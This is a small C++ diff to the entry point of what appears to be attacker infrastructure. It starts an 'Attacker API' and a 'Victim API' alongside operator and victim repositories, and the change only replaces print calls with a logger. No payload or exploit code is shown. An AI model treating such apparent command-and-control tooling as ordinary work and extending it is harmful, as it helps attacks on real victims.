@@ -10,6 +10,7 @@
 #include <OperatorRepository.hpp>
 #include <VictimRepository.hpp>
 #include "HttpUtils.hpp"
+#include "Logger.hpp"
 #include "Types.hpp"
 #include "Config.hpp"
 #include "VictimTemplateRepository.hpp"
@@ -44,10 +45,10 @@ int main(int argc, char* argv[]) {
     const int16_t attacker_port{ is_locally_run ? static_cast<int16_t>(1337) : config.get<int16_t>("attacker_api_port", 1337) } ;
     const int16_t victim_port{ is_locally_run ? static_cast<int16_t>(3000) : config.get<int16_t>("victim_api_port", 3000) };
 
-    std::println("Staring Attacker API on Port: {}", attacker_port);
+    logger::info("Staring Attacker API on Port: {}", attacker_port);
     std::jthread attacker_api(start_attacker_api, attacker_port);
 
-    std::println("Staring Victim API on Port: {}", victim_port);
+    logger::info("Staring Victim API on Port: {}", victim_port);
     std::jthread(start_victim_api, victim_port);
 }
 
